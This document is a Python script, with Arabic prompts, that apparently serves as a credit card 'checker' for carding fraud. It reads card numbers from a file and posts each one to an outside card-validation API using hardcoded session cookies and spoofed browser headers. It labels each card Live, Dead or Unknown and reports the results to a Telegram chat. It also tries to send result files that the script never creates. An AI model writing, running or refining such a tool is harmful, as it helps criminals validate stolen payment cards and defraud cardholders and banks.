import requests
import telebot
import time

id = input("أدخل أيديك : ")
bot_token = input("أدخل توكنك : ")
bot = telebot.TeleBot(bot_token)


url = 'https://www.mrchecker.net/card-checker/ccn2/api.php'
data = {'data': ''}


cookies = {
    'cf_clearance': '0PGkRs9qpSkB7P0zSztNMGJu4pO84sr3ZHv_FJ6FWWM-1688304123-0-160',
    '_ga_KF0QXBR963': 'GS1.1.1688762006.4.0.1688762006.0.0.0',
    '_ga': 'GA1.2.1060423466.1685729233',
    '_gid': 'GA1.2.1232896175.1688762007',
    '__cf_bm': 'NDpuJ.yhTN8F0s.ms4O7C2uj_Pb.32MtCm0O1fM3yGM-1688762007-0-AVjXC9HCLu2VELw0xaAcQ1h9kqF3IfV3DMS3wuIwOvELLZZoQBE/CkJYXx5Mj7MmpA==',
    '__gads': 'ID=c9e110c40dddd940-229732327ce20074:T=1688304143:RT=1688762007:S=ALNI_MYH1kithSywy9AeYZv2E5bQlRfs8w',
    '__gpi': 'UID=00000c8c2b79bfee:T=1688304143:RT=1688762007:S=ALNI_MaxA57zcKxUsG1LkDzraA6NhxViLQ',
}

headers = {
    'authority': 'www.mrchecker.net',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.mrchecker.net',
    'referer': 'https://www.mrchecker.net/card-checker/ccn2/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

with open('BESON.txt', 'r') as file:
    credit_cards = file.readlines()


for card in credit_cards:
    data['data'] = card.strip()
    response = requests.post(url, cookies=cookies, headers=headers, data=data)

    if 'Live' in response.text:
        bot.send_message(chat_id=id, text=f'Card: {card} \nResponse: Live')
    elif 'Die' in response.text:
        bot.send_message(chat_id=id, text=f'Card: {card} \nResponse: Dead')
    elif 'Unknown' in response.text:
        bot.send_message(chat_id=id, text=f'Card: {card} \nResponse: Unknown')

    
    time.sleep(2)


live_file = 'live_cards.txt'
dead_file = 'dead_cards.txt'
unknown_file = 'unknown_cards.txt'

files = [live_file, dead_file, unknown_file]
for file in files:
    with open(file, 'rb') as f:
        bot.send_document(chat_id=id, document=f)
        
        time.sleep(2)


bot.polling()
